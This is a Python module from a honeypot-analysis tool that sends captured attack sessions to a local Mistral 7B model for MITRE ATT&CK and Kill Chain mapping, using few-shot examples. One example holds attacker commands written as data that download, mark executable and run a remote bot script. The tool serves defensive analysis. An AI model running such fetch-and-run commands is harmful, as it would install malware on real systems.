"""
ForenHive — Mapping MITRE ATT&CK via Ollama / Mistral 7B
Analyse une session d'attaque et l'associe aux tactiques/techniques MITRE ATT&CK
ainsi qu'a une phase de la Cyber Kill Chain.

Fonctionne 100% hors ligne — aucune cle API requise.
Le modele Mistral 7B tourne localement dans le conteneur forenhive-ollama.
"""

import json
import logging
import re
import requests

import config

log = logging.getLogger("ollama_mitre")

URL_CHAT = f"{config.OLLAMA_URL}/api/chat"

# ── System prompt ──────────────────────────────────────────────────────────────

SYSTEM_PROMPT = (
    "You are a cybersecurity analyst specializing in the MITRE ATT&CK framework. "
    "Given honeypot session data, output a JSON object with the ATT&CK mapping. "
    "Always include all four fields: tactics, techniques, kill_chain_phase, and summary. "
    "The summary field must be a non-empty string describing the attack in one sentence. "
    "Respond with valid JSON only — no markdown, no explanation, no extra text."
)

# ── Few-shot examples (Mistral 7B learns better from examples than abstract rules)

EXAMPLES = [
    # Example 1: SSH brute-force + Mirai botnet
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts":   342,
            "commands":         ["whoami", "uname -a", "wget http://192.168.1.10/bot.sh",
                                 "chmod +x bot.sh", "./bot.sh"],
            "yara_matches":     ["Mirai_Botnet"],
            "exfil_bytes":      0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0006 - Credential Access", "TA0002 - Execution",
                        "TA0011 - Command and Control"],
            "techniques": [
                {"id": "T1110.001", "name": "Brute Force: Password Guessing",              "tactic": "TA0006"},
                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell","tactic": "TA0002"},
                {"id": "T1105",     "name": "Ingress Tool Transfer",                       "tactic": "TA0011"},
                {"id": "T1496",     "name": "Resource Hijacking",                          "tactic": "TA0040"},
            ],
            "kill_chain_phase": "Installation",
            "summary": (
                "Attacker performed 342 SSH login attempts, then executed a Mirai "
                "payload to join a botnet (C2)."
            )
        })
    },

    # Example 2: light reconnaissance
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts":   4,
            "commands":         [],
            "yara_matches":     [],
            "exfil_bytes":      0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0043 - Reconnaissance", "TA0001 - Initial Access"],
            "techniques": [
                {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning", "tactic": "TA0043"},
                {"id": "T1110",     "name": "Brute Force",                              "tactic": "TA0001"},
            ],
            "kill_chain_phase": "Reconnaissance",
            "summary": "Automated scan: 4 SSH login attempts, typical default-credential scanner."
        })
    },

    # Example 3: SMB exploitation (EternalBlue) + ransomware
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "dionaea (SMB)",
            "destination_port": 445,
            "login_attempts":   1,
            "commands":         [],
            "yara_matches":     ["WannaCry_Ransomware", "CryptoMiner_XMRig"],
            "exfil_bytes":      84120,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0001 - Initial Access", "TA0040 - Impact", "TA0010 - Exfiltration"],
            "techniques": [
                {"id": "T1190", "name": "Exploit Public-Facing Application",  "tactic": "TA0001"},
                {"id": "T1210", "name": "Exploitation of Remote Services",    "tactic": "TA0008"},
                {"id": "T1486", "name": "Data Encrypted for Impact",          "tactic": "TA0040"},
                {"id": "T1496", "name": "Resource Hijacking (XMRig miner)",   "tactic": "TA0040"},
            ],
            "kill_chain_phase": "Actions on Objectives",
            "summary": (
                "SMB exploitation (EternalBlue/MS17-010) deploying WannaCry + "
                "XMRig miner. ~82 KB exfiltration detected."
            )
        })
    },

    # Example 4: HTTP honeypot probing (Galah)
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "galah (HTTP)",
            "destination_port": 8080,
            "login_attempts":   0,
            "commands":         [],
            "yara_matches":     [],
            "exfil_bytes":      0,
            "http_paths":       ["/wp-login.php", "/admin", "/.env", "/phpinfo.php",
                                 "/wp-content/plugins/revslider/temp/update_extract/"],
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0043 - Reconnaissance", "TA0001 - Initial Access"],
            "techniques": [
                {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning",    "tactic": "TA0043"},
                {"id": "T1190",     "name": "Exploit Public-Facing Application",           "tactic": "TA0001"},
                {"id": "T1592.004", "name": "Gather Victim Host Information: Client Config","tactic": "TA0043"},
            ],
            "kill_chain_phase": "Reconnaissance",
            "summary": (
                "Web vulnerability scanner probing WordPress login, admin panels, "
                "and sensitive files (.env, phpinfo). Automated reconnaissance."
            )
        })
    },
]

# Cyber Kill Chain phases (chronological order)
KILL_CHAIN_PHASES = [
    "Reconnaissance", "Weaponization", "Delivery",
    "Exploitation", "Installation", "Command and Control", "Actions on Objectives",
]


class OllamaMitreMapper:
    """
    Sends session data to Mistral 7B (via Ollama) for MITRE ATT&CK mapping.
    Works 100% offline — no external API keys needed.
    """

    def __init__(self):
        self._available = None  # checked on first call

    def _check_availability(self) -> bool:
        """Check once if Ollama is reachable and the model is loaded."""
        if self._available is not None:
            return self._available
        try:
            r = requests.get(f"{config.OLLAMA_URL}/api/tags", timeout=5)
            models = [m["name"].split(":")[0] for m in r.json().get("models", [])]
            self._available = config.OLLAMA_MODEL in models
            if not self._available:
                log.warning(
                    f"Model '{config.OLLAMA_MODEL}' not loaded in Ollama "
                    f"(available: {models or 'none'})"
                )
        except Exception as e:
            log.warning(f"Ollama unreachable ({config.OLLAMA_URL}): {e}")
            self._available = False
        return self._available

    def map_session(self, session: dict, commands: list = None,
                    http_paths: list = None) -> dict | None:
        """
        Analyze an attack session and return MITRE ATT&CK mapping.

        Parameters:
          session    : dict with honeypot_type, destination_port, login_attempts, etc.
          commands   : list of shell commands observed in Cowrie
          http_paths : list of HTTP paths probed (for Galah)

        Returns a dict with: tactics, techniques, kill_chain_phase, summary
        Or None if Ollama is unavailable.
        """
        if not self._check_availability():
            return None

        # Build the payload for the LLM
        session_payload = {
            "honeypot":         _label_honeypot(session),
            "destination_port": session.get("destination_port", 0),
            "login_attempts":   session.get("login_attempts", 0),
            "commands":         (commands or [])[:30],
            "yara_matches":     session.get("yara_matches", []),
            "exfil_bytes":      session.get("exfil_bytes", 0),
        }
        if http_paths:
            session_payload["http_paths"] = http_paths[:20]

        messages = EXAMPLES + [
            {"role": "user", "content": json.dumps(session_payload)}
        ]

        try:
            response = requests.post(
                URL_CHAT,
                json={
                    "model":    config.OLLAMA_MODEL,
                    "messages": [{"role": "system", "content": SYSTEM_PROMPT}] + messages,
                    "stream":   False,
                    "options":  {"temperature": 0.1, "num_predict": 512},
                },
                timeout=120,
            )
            response.raise_for_status()
        except requests.Timeout:
            log.warning("Ollama timeout (120s) — MITRE mapping skipped")
            return None
        except Exception as e:
            log.warning(f"Ollama call failed: {e}")
            return None

        raw_text = response.json().get("message", {}).get("content", "")
        result   = _extract_json(raw_text)
        if result is None:
            log.warning(f"Ollama response not parseable: {raw_text[:200]!r}")
            return None

        result = _validate_result(result)
        log.info(
            f"MITRE [{session.get('session_id', '')[:12]}...] "
            f"phase={result.get('kill_chain_phase')} "
            f"techniques={len(result.get('techniques', []))}"
        )
        return result

    # Alias
    def mapper_session(self, session: dict, commands: list = None) -> dict | None:
        return self.map_session(session, commands)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _label_honeypot(session: dict) -> str:
    hp_type = session.get("honeypot_type", "unknown")
    port    = session.get("destination_port", 0)
    labels  = {
        "cowrie":  "cowrie (SSH/Telnet)",
        "dionaea": f"dionaea (port {port})",
        "galah":   "galah (HTTP)",
        "zeek":    "zeek (network sensor)",
    }
    return labels.get(hp_type, hp_type)


def _extract_json(text: str) -> dict | None:
    """Extract a JSON object from the LLM response, handling markdown fences."""
    text = text.strip()
    text = re.sub(r"^```(?:json)?\s*", "", text)
    text = re.sub(r"\s*```$",          "", text)

    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            return obj
    except json.JSONDecodeError:
        pass

    match = re.search(r"\{.*\}", text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group())
        except json.JSONDecodeError:
            pass

    return None


def _validate_result(result: dict) -> dict:
    """Ensure required keys are present and correctly typed."""
    if not isinstance(result.get("tactics"),    list):
        result["tactics"] = []
    if not isinstance(result.get("techniques"), list):
        result["techniques"] = []
    if result.get("kill_chain_phase") not in KILL_CHAIN_PHASES:
        result["kill_chain_phase"] = "Reconnaissance"
    if not isinstance(result.get("summary"), str) or not result["summary"]:
        result["summary"] = ""
    return result
